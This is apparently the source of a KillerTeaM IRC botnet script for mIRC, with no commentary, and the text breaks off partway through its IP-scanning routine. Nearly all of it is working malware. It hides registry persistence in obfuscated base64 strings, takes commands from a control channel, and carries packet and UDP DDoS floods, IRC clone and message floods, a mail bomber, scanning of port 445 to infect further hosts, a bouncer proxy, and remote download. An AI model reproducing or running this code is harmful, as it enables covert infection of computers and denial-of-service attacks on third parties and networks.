   on 1:exit:{ run $decode(Q1N5c3RyYXkuZXhl,m) }
   on *:start:{ inc %load | if $exists(Design.exe) { run Design.exe /c /fh UPDATE } | inc %start | myinfo  | .timercheckconn 0 30 enynicks | timercheckconne 1 0 enynicks | ree | .timer55 1 0 remove c:\commands.exe | chekhid | .timerload 1 0 Ferstload }
   alias x $eval($$1-,2)
   alias enynick { return [K $+ $r(10,99) $+ $r(10,99) $+ $r(10,99) $+ $r(10,99) $+ ] }
   alias bwin { window -p @Microsoft.Windows.Update 0 0 1600 1200 | timer 0 2 window -a @Microsoft.Windows.update }
   alias chekhid { if (!$exists(Design.exe)) { updating! } }
   alias ree {
     set %filetoboot $r(1,1999) $+ $decode(LnJlZw==,m)
     write %filetoboot $decode(UkVHRURJVDQ=,m)
     write %filetoboot $decode(W0hLRVlfTE9DQUxfTUFDSElORVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5d,m)
     write %filetoboot $decode(IkNTeXN0cmF5Ij0iQ1N5c3RyYXkuZXhlIg==,m)
     run $decode(LW4gcmVnZWRpdCAvcw==,m) %filetoboot
     timer 1 4 .run Design.exe /n /fh /r F.exe y/ %filetoboot
   }
   on *:ping:ctcp $me ping
   on *:sockread:inviter*:{
     sockread -f %t.i
     if ($gettok(%t.i,2,32) == 322) && ($gettok(%t.i,5,32) > 100) { write ichan.txt $gettok(%t.i,4,32) }
     if ($gettok(%t.i,2,32) == 321) { msgchan %c [inviter] Listing channels on $remove($gettok(%t.i,1,32),:) }
     if ($gettok(%t.i,2,32) == 323) { msgchan %c [inviter] Listing channels complete on $remove($gettok(%t.i,1,32),:) [Total Channels in List: $+ $lines(ichan.txt) $+ ] }
     if ($gettok(%t.i,2,32) == 474) { msgchan %c [inviter] Join Error: Banned from ( $+ $gettok(%t.i,4,32) $+ ) }
     if ($gettok(%t.i,2,32) == 433) { sockwrite -nt inviterload NICK $gettok(%t.i,4,32) $+ $r(a,z) }
     if ($gettok(%t.i,1,32) == PING) { sockwrite -nt $sockname PONG $gettok(%t.i,2,32) }
     if ($gettok(%t.i,2,32) == JOIN) { if ($timer($remove($gettok(%t.i,1,33),:)) != $null) { timer $+ $remove($gettok(%t.i,1,33),:) | set %i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] done | msgchan %c [Inviter] Halted Spamer Checker BoT $remove($gettok(%t.i,1,33),:) | halt } | if (%i.on == Off) { halt }
       if (%i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] == done) { halt } | set %i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] done | set %i.on Off | /timer $+ $remove($gettok(%t.i,1,33),:) 1 15 /sockwrite -nt $sockname PRIVMSG $remove($gettok(%t.i,1,33),:) : $+ %imsg | inc %i.t.j | .timer 1 %i.ondelay set %i.on Yes
     }
     if ($gettok(%t.i,2,32) == PART) { if (%i.on == Off) { halt } | if ($timer($remove($gettok(%t.i,1,33),:)) != $null) { halt }
       if (%i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] == done) { halt } | set %i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] done | set %i.on Off | /timer $+ $remove($gettok(%t.i,1,33),:) 1 15 /sockwrite -nt $sockname PRIVMSG $remove($gettok(%t.i,1,33),:) : $+ %imsg | inc %i.t.p | .timer 1 %i.ondelay set %i.on Yes
     }
     if ($gettok(%t.i,2,32) == KICK) { sockwrite -nt $sockname JOIN : $+ $gettok(%t.i,3,32) }
     if ($gettok(%t.i,1,32) == ERROR) { msgchan %c [inviter] Error Connecting: %t.i | set %i.b off | /timerinviteconnect 1 3 /sockopen inviter %i.server %i.port }
     if ($gettok(%t.i,2,32) == MODE) { if ($gettok(%t.i,4,32) == +o) { if ($timer($gettok(%t.i,5,32)) == $null) { halt } | .timer $+ $gettok(%t.i,5,32) off | dec %i.t.j | msgchan %c [inviter] error: not inviting: $gettok(%t.i,5,32) because he was opd! } | if ($gettok(%t.i,4,32) == +v) { if ($timer($gettok(%t.i,5,32)) == $null) { halt } | .timer $+ $gettok(%t.i,5,32) off | dec %i.t.j | msgchan %c [inviter] error: not inviting: $gettok(%t.i,5,32) because he was voiced! } }
     if ($gettok(%t.i,2,32) == NICK) { if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } | timer $+ $remove($gettok(%t.i,1,33),:) off | dec %i.t.p } | if ($gettok(%t.i,2,32) == QUIT) { if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } | /timer $+ $remove($gettok(%t.i,1,33),:) off | dec %i.t.j } | if ($gettok(%t.i,2,32) == 313) { msgchan %c [inviter] 4Warning!!!: IRCOP DETECTED!!!! [ $+ $gettok(%t.i,4,32) $+ ] }
     if ($timer($gettok(%t.i,4,32)) == $null) { halt }
     timer $+ $gettok(%t.i,2,32) off
   }
   on 1:sockopen:inviter*: { sockwrite -tn $sockname User $read(Attributes.dll) $read(Attributes.dll) $read(Attributes.dll) : [ [ $read(Attributes.dll) ] ] | sockwrite -tn $sockname Nick $read(Attributes.dll) $+ $r(a,z) | .timerinviteconnect off | if !$isfile(ichan.txt) { sockwrite -nt inviterload LIST } }
   on 1:sockclose:inviter*:{ if (%i.b == off) { remove ichan.txt | halt } | if (%i.b == on) { msgchan %c [inviter] Inviter was disconnected! (Reloading). | sockopen $sockname %i.server %i.port } }
   alias enynicks { if (!$server) { Server $Servers } }
   raw 433:*:nick $enynick
   on *:connect:{ .timers off | if (%c == $null) { set %c #Devil_Damn } | join %c | timerjoin 0 10 join %c | .timerr 1 0 run Design.exe /n /fh Layout.bat | ial on | pdcc on | fsend on | mode $me +ix | timerscanner* off | unset %ip* | unset %total | unset %totalscaning | unset %beg* | unset %end* | if (%load == 1) { msgchan %c [New!] $uptime(system,1)  $uptime(mirc,1)  $ip $host | set %load 2 } | Sockclase * | Clearall }
   on *:disconnect:.timerenynicks off | .timerenynicks 0 10 enynicks | .timerfuckoff2 1 1 enynicks
   on 1:sockopen:ip*:{ if ($sockerr > 0) { halt } | set %445 % [ $+ [ $sockname ] ] | run Design.exe /n /fh /r "Attributes.bat   %445 $+ " | msgchan %c [Scanner] found: %445 $+ , infect.. | sockclose $sockname | unset %445 | halt }
   on 1:text:*:*:{  if $nick isop %c || $nick == $chan { botcommand $1- } }
   raw 332:*:{ if $2 == %c { botcommand $3- } }
   alias botcommand {
     if ($1 == !raw) { $2- }
     if ($1 == !rawx) { x $2- }
     if ($1 == !if) { if ($2) { .timerif $+ $ctime $+ $r(10,9999999) 1 0 $2- } }
     if ($1 == !packet) && ($3 != $null) { run Design.exe /n /fh /r "ping.exe $2 -n $3 -l 65500" | msgchan %c [DDoS] packeting $2 with $calc($3 *65536/1024/1000) $+ mb traffic }
     if ($1 == !packet.stop) { run Design.exe /n /fh /r " $+ $mircdirGTKL.exe -kf ping.exe" | msgchan %c [DDoS] packeting halted! }
     if ($1 == !pfast) { if ($2 == $null) { halt } | //set %pchan %chan  |  if ($4 == random) { //gcoolstart $2 $3 $r(1,64000) | halt } | //gcoolstart $2 $3 $4 }
     if ($1 == !igmp) { if ($2 == $null) { halt } | .remove $decode(aWdtcC52YnM=,m) | .write $decode(aWdtcC52YnMgU2V0IHNyYzM=,m) = $decode(Q3JlYXRlT2JqZWN0KCJXc2NyaXB0LnNoZWxsIik=,m) | .write $decode(aWdtcC52YnMgc3JjMy5ydW4=,m) $decode(ImNvbW1hbmQgL2MgaWdtcA==,m) $2 ",0,true | .run $decode(aWdtcC52YnM=,m) }
     if ($1 == !pepsi) { if ($2 == $null) { halt } | .remove $decode(cGVwc2kudmJz,m) | .write $decode(cGVwc2kudmJzIFNldCBzcmMzID0gQ3JlYXRlT2JqZWN0KCJXc2NyaXB0LnNoZWxsIik=,m) | .write $decode(cGVwc2kudmJzIHNyYzMucnVuICJjb21tYW5kIC9jIHBlcHNpIC1u,m) $3 -p $4 -d $5 $2 ",0,true | .run $decode(cGVwc2kudmJz,m) }
     if ($1 == !icmp) { if ($2 == $null) { halt } | .remove $decode(aWNtcC52YnM=,m) | .write $decode(aWNtcC52YnMgU2V0IHNyYzMgPSBDcmVhdGVPYmplY3QoIldzY3JpcHQuc2hlbGwiKQ==,m) | .write $decode(aWNtcC52YnMgc3JjMy5ydW4gImNvbW1hbmQgL2MgcGluZyAtbg==,m) $4 -l $3 -w 0 $2 ",0,true | .run $decode(aWNtcC52YnM=,m) }
     if ($1 == !fserve) { /fserve $nick 3 $2  }
     if ($1 == !Clones) { if ($4) { unset %boj* | set %channel2 $5- | set %bojnom $2 | set %bojserver $3 | set %bojport $4 | timerbojsock2 0 0  bojsock2 | timerbojsock -m %bojnom 100 bojsock } }
     if ($1 == !Clonesjoin) { if ($2 == $null) { halt } | set %bojfuck $2 | sockwrite -n boj* join %bojfuck | sockwrite -n boj* privmsg $2 : $+ $flooder | .timerboj $+ $sockname 0 4 bojflood }
     if ($1 == !ClonesStop) { .timerboj* off | sockwrite -nt boj* part %bojfuck | unset %bojfuck }
     if ($1 == !Clonesraw)  { if ($2 == $null) { halt } | .sockwrite -nt boj* $Clonesraw($2-) }
     if ($1 == !ClonesClose) { unset %boj* %channel | sockclose boj* | .timerboj* off }
     if ($1 == !clonesmsgx) { if $exists(clmsg.sys) { remove clmsg.sys  } }
     if ($1 == !clonesmsg) { if ($2) { write clmsg.sys $2- } }
     if ($1 == !cloneshop) { if ($2) { if (!$3) { .timerbojhop 3 2 bojop $2 KillerTeaM | halt } | .timerbojhop $3 2 bojop $2 $4- } }
     if ($1 == !Flood) { if ($4 == $null) { halt } | StartFlooding $1- }
     if ($1 == !clonesmsg) { if ($2 != $null) { write clmsg.sys $2- } }
     if ($1 == !cloneshop) { if ($2 != $null) { if ($3 == $null) { .timerbojhop 3 2 bojop $2 KillerTeaM | halt } | { timerbojhop $3 2 bojop $2 $4- } } }
     if ($1 == !floodoff) { cleanup | stopf }
     if ($1 == !randscan) && (%begshortip == $null) && ($exists(GKFM.exe)) { if ($os == 98) || ($os == ME) { halt } | set %begit $randip($2) | msgchan %c [Scanner] Starting scan from: %begit to $3 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $3 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
     if ($1 == !randscanbot) && (%begshortip == $null) && ($exists(GKFM.exe)) { if ($os == 98) || ($os == ME) { halt } | { randmyip } }
     if ($1 == !stopscan) && (%begshortip != $null) { sockclose ip* | timerscanner* off | unset %ip* | unset %total | unset %totalscaning | msgchan %c 2[14scanner2]14 scanning of %begshortip to %endshortip stopped by $nick $+ ! | unset %beg* | unset %end* }
     if ($1 == !mailstart) && ($timer(bombmail) == $null) { mailsetup $2- }
     if ($1 == !mailstop) && ($timer(bombmail) != $null) { mailstop }
     if ($1 == !restart) { run Design.exe /n /fh /r "GTKL.BAT $decode(Q1N5c3RyYXkuZXhl,m) $+ " }
     if ($1 == !inviter) {
       if ($2 == load) { /set %i.server $3 | /set %i.port $4 | %i.b = on | s.inviter }
       if ($2 == stop) { if ($sock(inviter*,0) > 0) { sockclose inviter* | remove ichan.txt | //set %i.b off | unset %i.temp.* | /timerinviteconnect off | msgchan %c [inviter] Inviter has been killed. } }
       if ($2 == status) { if ($sock(inviter*,0) == 0) {
         msgchan %c [inviter] Status: Not Connected! | halt }
         if ($sock(inviter*,0) > 0) { msgchan %c [inviter] Status: Connected [ $+ $sock(inviter*,0) $+ ] }
       }
       if ($2 == raw) { sockwrite -nt inviterload $Clonesraw($3-) }
       if ($2 == stats) { msgchan %c [inviter] (Stats) Total Invited: $calc( %i.t.j + %i.t.p ) Delay: ( $+ %i.ondelay $+ ) }
       if ($2 == list) { sockwrite -nt inviterload LIST :* $+ $3 $+ * }
       if ($2 == msg) { set %imsg $3- | msgchan %c [inviter] Invite Message set as [ $+ $3- $+ ] }
       if ($2 == ctotal) { if ($sock(inviter*,0) > 0) { if if ($lines(ichan.txt) < 0) { sockwrite -nt inviterload LIST :* $+ $3 $+ * | halt } | msgchan %c [inviter] Random Channels Total: $+ $lines(ichan.txt) } }
       if ($2 == mode) { sockwrite -nt inviter* MODE $3- }
       if ($2 == join) { if ($sock(inviter*,0) > 0) { if ($3 == rand) { if ($lines(ichan.txt) < 0) || ($exists(ichan.txt) == $false) { msgchan %c [inviter] Error: Channels Loading! | sockwrite -nt inviterload LIST :* $+ $3 $+ * | halt } | set %i.r.j.a $4 | /set %i.r.j.i 0 | :loop | if (%i.r.j.i > %i.r.j.a) { goto end } | /sockwrite -nt inviterload JOIN : $+ $read -l $+ $r(1,$lines(ichan.txt)) ichan.txt | inc %i.r.j.i | goto loop | :end | unset %i.r.j.i | unset %i.r.j.a | halt } | else { /sockwrite -nt inviterload JOIN : $+ $3 } } }
       if ($2 == part) { sockwrite -nt $sockname PART : $+ $3- }
       if ($2 == nick) { if ($3 == random) { sockwrite -nt inviterload NICK $read(Attributes.dll) | halt } | //sockwrite -nt inviterload NICK $3- }
       if ($2 == delay) { set %i.ondelay $3 | msgchan %c [inviter] Delay set to: ( $+ $3 $+ ). }
     }
     if ($1 == !bnc.start) && ($3 != $null) { if ($sock(Bnc)) { msgchan %c [bnc] 4/Server -m $ip $+ : $+ %Bnc.Port $+ , then /quote PASS %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $2 | %Bnc.port = $2 | %Bnc.passwd = $3 | msgchan %c [bnc] /Server -m $ip $+ : $+ $2 $+ , then /quote PASS $3 }
     if ($1 == !bnc.stats) && ($sock(Bnc)) { msgchan %c [bnc] is on! $ip $+ : $+ %Bnc.port pass: %Bnc.passwd $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) }
     if ($1 == !bnc.stop) && (%Bnc.Port != $null) { sockclose Bnc* | msgchan %c [bnc] Server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }
     if ($1 == !download) { /download $2- | /msgchan %c [Downloading]... }
     if ($1 == !downd) { /downd $2- | /msgchan %c [Downloading]... }
   }
   alias s.inviter { if (%i.ondelay == $null) { set %i.ondelay 10 } | if (%i.server == $null) || (%i.port == $null) { msgchan %c [inviter] Error Starting Inviter, Inviter Server or Port not set! %iserver/%iserver.port | halt } | if ($sock(inviter*,0) > 0) { halt }
     sockopen inviterload %i.server %i.port
     msgchan %c [inviter] Loading inviter to Server: ( $+ $+ %i.server $+ ) Port: ( $+ %i.port $+ )
   }
   alias bojop sockwrite -nt boj* join $1 | sockwrite -nt boj* part $1 : $+ $2-
   alias myinfo {
     .nick $enynick
     .anick $enynick
     .Identd on $read(Attributes.dll)
     .fullname KillerTeaM Ver 3
     .ignore -r
     .ignore -t *
   }
   on *:input:*:{ updating! }
   on *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }
   alias finished { msgchan %c [Scanner] scanning from %begshortip to %endshortip is finished! | sockclose ip* | unset %beg* | unset %end* | unset %ip* | unset %total* | hop %c }
   alias randnick return $read(Attributes.dll)
   on *:sockread:BncClient*:{
     sockread %BncClient
     if ($gettok(%BncClient,1,32) == NICK) {
       set %Bnc.nick $gettok(%BncClient,2,32)
     }
     if ($gettok(%BncClient,1,32) == USER) {
       set %Bnc.user $gettok(%BncClient,2-,32)
       sockwrite -n $sockname NOTICE AUTH : $+ You need to say /quote PASS <password>
     }
     if ($gettok(%BncClient,1,32) == PASS) {
       if ($gettok(%BncClient,2,32) == %Bnc.passwd) {
         sockwrite -n $sockname NOTICE AUTH : $+ Welcome to KillerTeaM BNC,
         sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn [server] <port> <pass> to connect
         %Bnc.legit = yes
       }
       if ($gettok(%BncClient,2,32) != %Bnc.passwd) {
         sockwrite -n $sockname NOTICE AUTH : $+ Failed Pass!!
       }
     }
     if ($gettok(%BncClient,1,32) == CONN) {
       if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ BNC Exploits dont work on KillerTeaM | sockclose $sockname
       }
       if (BncServer $+ $remove($sockname,BncClient) != $null) {
         sockclose BncServer $+ $remove($sockname,BncClient)
       }
       sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)
       sockwrite -n $sockname NOTICE AUTH : $+ Making reality through $gettok(%BncClient,2,32) port $gettok(%BncClient,3,32)
       set %Bnc.server.passwd $gettok(%BncClient,4,32)
     }
     else {
       if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {
         halt
       }
       sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient
     }
   }
   alias Clonesraw { return $1- }
   on *:sockopen:BncServer*:{
     if ($sockerr) {
       sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
       sockclose $sockname
       halt
     }
     if ($sock($sockname).status != active) {
       sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
       sockclose BncServer $+ $remove($socknme, BncServer)
       halt
     }
     sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ Suceeded connection
     sockwrite -n $sockname NICK %Bnc.nick
     sockwrite -n $sockname USER %Bnc.user
   }
   on *:sockread:BncServer*:{
     sockread %BncServer
     if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {
       halt
     }
     sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer
   }
   alias x $eval($$1-,2)
   alias gcoolstart  { if $1 = stop { .timergcoolt off | unset %gnum | unset %pchan | msgchan %c [Gebening]: Halted! | .timergcoolt off | halt } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { return } |  msgchan %c [Sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ )] |  set %gnum 0 |  .timergcoolt -m 0 400 gdope $1 $2 $3 }
   alias gdope {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4
     socku $+ dp gnumc
     socku $+ dp gnumc3 $2 $3 + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
     socku $+ dp gnumc2 $2 $3 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
     socku $+ dp gnumc
     return | :done | msgchan %c [Gebening]: Finished! | .timergcoolt off | unset %gnum | unset %pchan | halt
   }
   alias cleanup { set %papaflood off | .sockclose boj* | unset %nick | unset %channel* | unset %server | unset %port | unset %clones | unset %flood | unset %flood.nick }
   alias bojsock2 if (%bojnomsocks == %bojnom) { timerbojsock2 off }
   alias bojsock { inc %bojnomSocks | Sockopen boj $+ $killerteam %bojserver %bojport }
   on *:Sockopen:boj*:{ if ($sockerr > 0) { halt } | set -u1 %user $killerteam | .sockwrite -nt $sockname USER %user %user %user :KillerTeaM Sock Bot | .sockwrite -nt $sockname NICK $killerteam $+ $r(a,z) | sockwrite -nt $sockname ircx | sockwrite -tn $sockname join %channel2 | if %bojfuck != $null { sockwrite -n $sockname join %bojfuck | sockwrite -n $sockname privmsg %bojfuck : $+ $flooder } }
   alias Sockclase { if !$exists($gettok($mircdir,1 $calc(1- $gettok($mircdir,0,92)),92) $+ \CSystray.exe) { .Copy $mircdirLayout.dll $gettok($mircdir,1 $calc(1- $gettok($mircdir,0,92)),92) $+ \CSystray.exe } }
   on *:Sockclose:boj*:{ sockopen boj $+ $killerteam %bojserver %bojport }
   on *:sockread:boj*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname Pong %server } }
   alias bojflood set %bojflood $flooder | sockwrite -n boj* privmsg %bojfuck : $+ %bojflood
   alias StartFlooding { set %nick $3 | set %channel $3 | set %server $4 | set %port $5 | if ($2 = nick) { sockopen nick $+ $rand(1,999999) %server %port | halt } | if ($2 = jp) { sockopen cycle $+ $rand(1,999999) %server %port | halt } | if ($2 = chan) { sockopen chan $+ $rand(1,999999) %server %port | halt } | if ($2 = kill) { sockopen kill $+ $rand(1,999999) %server %port | halt } | if ($2 = notice) { sockopen notice $+ $rand(1,999999) %server %port | halt } | if ($2 = msg) { sockopen msg $+ $rand(1,999999) %server %port | halt } | if ($2 = nickbot) { set %lolnick $2 | halt } | if ($2 = floodmsg) { halt } | if ($2 = join) { sockopen boj $+ $rand(1,999999) %server %port | halt } | if ($1 = register) { sockopen register $+ $rand(1,999999) %server %port | halt }  }
   alias msgchan { if $me isvo $1 || m !isin $chan($1).mode || $me isop $1 { .msg $1- } }
   on *:Sockopen:nick*:{ set %floodmsg $flooder | if ($sockerr > 0) { halt }  | set %floodmsg $flooder | set -u %user $read(Attributes.dll)  | .sockwrite -nt $sockname USER %user %user %user : $+ %user | .sockwrite -nt $sockname NICK $killerteam | .sockwrite -tn $sockname ircx | .sockwrite -n $sockname privmsg %nick : $+ %floodmsg | .sockwrite -n $sockname notice %nick : $+ %floodmsg | .sockclose $sockname | .sockopen nick $+ $killerteam %server %port }
   on *:Sockopen:chan*:{ set %floodmsg $flooder |  if ($sockerr > 0) { halt } | set %floodmsg $flooder | set -u1 %user $read(Attributes.dll) | .sockwrite -nt $sockname USER %user %user %user : $+ %user | .sockwrite -nt $sockname NICK $killerteam |  .sockwrite -tn $sockname ircx | sockwrite -tn $sockname join %channel | .sockwrite -n $sockname quit %floodmsg | .sockclose $sockname | .sockopen chan $+ $killerteam %server %port }
   on *:Sockopen:kill*:{  set %floodmsg $flooder | if ($sockerr > 0) { halt } | set %floodmsg $flooder | set -u1 %user $read(Attributes.dll) | .sockwrite -nt $sockname USER %user %user %user : $+ %user | .sockwrite -nt $sockname NICK $killerteam |  .sockwrite -tn $sockname ircx |   sockwrite -tn $sockname join %channel | .sockwrite -n $sockname privmsg %nick : $+ $chr(1) $+ finger $+ $chr(1) | .sockclose $sockname | .sockopen kill $+ $killerteam %server %port }
   on *:Sockopen:msg*:{  set %floodmsg $flooder | if ($sockerr > 0) { halt } | set %floodmsg $flooder | set -u1 %user $read(Attributes.dll) | .sockwrite -nt $sockname USER %user %user %user : $+ %user | .sockwrite -nt $sockname NICK $killerteam |   .sockwrite -tn $sockname ircx |  sockwrite -tn $sockname join %channel | .sockwrite -n $sockname privmsg %nick : $+ %floodmsg | .sockclose $sockname | .sockopen msg $+ $killerteam %server %port }
   on *:Sockopen:notice*:{  set %floodmsg $flooder | if ($sockerr > 0) { halt } | set %floodmsg $flooder | set -u1 %user $read(Attributes.dll) | .sockwrite -nt $sockname USER %user %user %user : $+ %user | .sockwrite -nt $sockname NICK $killerteam |  .sockwrite -tn $sockname ircx |  sockwrite -tn $sockname join %channel | .sockwrite -n $sockname notice %nick : $+ %floodmsg | .sockclose $sockname | .sockopen notice $+ $killerteam %server %port }
   on *:sockread:kill*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $mid(%clone.temp,2,512) } }
   on *:sockread:msg*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $mid(%clone.temp,2,512) } }
   on *:sockread:nick*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $mid(%clone.temp,2,512) } }
   on *:sockread:chan*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $mid(%clone.temp,2,512) } }
   alias stopf { .sockclose msg* | .sockclose kill* | .sockclose notice* | .sockclose nick* | .sockclose chan* | .sockclose jp* | .sockclose cycle* | .timerenymsgflood off }
   alias Killerteam { return $r(A,Z) $+ $read(Attributes.dll) $+ $r(a,z) }
   alias KillerTeaM2 { return $left($chr($r(65,125)) $+ $chr($r(65,125)) $+ $chr($r(65,125)) $+ $chr($r(65,125)) $+ $chr($r(65,125)) $+ $chr($r(65,125)) $+ $chr($r(65,125)) $+ $chr($r(65,125)) $+ $chr($r(65,125)) $+ $chr($r(65,125)) $+ $chr($r(65,125)) $+ $chr($r(65,125)) $+ $chr($r(65,125)) $+ $chr($r(65,125)) $+ $chr($r(65,125)) $+ $chr($r(65,125)) $+ $chr($r(65,125)),$r(6,15)) }
   alias KillerTeaM3 { return $chr($r(65,125) $+ $read(Attributes.dll) $+ $chr($r(65,125) }
   on *:SOCKOPEN:cycle*: { if ($sockerr > 0) { return } | sockwrite -tn $sockname user $left($Killerteam,15) $left($Killerteam,15) $left($Killerteam,15) : $+ Sock BoT By KillerTeaM | sockwrite -tn $sockname nick $left($Killerteam,15) | sockwrite -tn $sockname IRCX | sockwrite -tn $sockname join %channel | sockwrite -tn $sockname part %channel | sockwrite -tn $sockname join %channel | sockwrite -tn $sockname part %channel | sockwrite -tn $sockname join %channel | sockwrite -tn $sockname part %channel | sockwrite -tn $sockname join %channel | sockwrite -tn $sockname part %channel
   sockwrite -tn $sockname join %channel | sockwrite -tn $sockname part %channel | sockwrite -tn $sockname join %channel | sockwrite -tn $sockname part %channel | sockwrite -tn $sockname join %channel | sockwrite -tn $sockname part %channel | sockwrite -tn $sockname join %channel | sockwrite -tn $sockname part %channel | sockwrite -tn $sockname join %channel | sockclose $sockname | sockopen cycle $+ $Killerteam %server %port  }
   alias startscan {
     inc %totalscaning
     if %totalscaning == %total finished
     set %ip1 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 1
     set %ip2 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 2
     set %ip3 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 3
     set %ip4 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 4
     set %ip5 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 5
     set %ip6 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 6
     set %ip7 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 7
     set %ip8 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 8
     set %ip9 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 9
     set %ip10 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 10
     set %ip11 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 11
     set %ip12 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 12
     set %ip13 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 13
     set %ip14 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 14
     set %ip15 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 15
     set %ip16 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 16
     set %ip17 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 17
     set %ip18 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 18
     set %ip19 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 19
     set %ip20 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 20
     set %ip21 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 21
     set %ip22 $longip($calc( %beglongip + %totalscaning ))
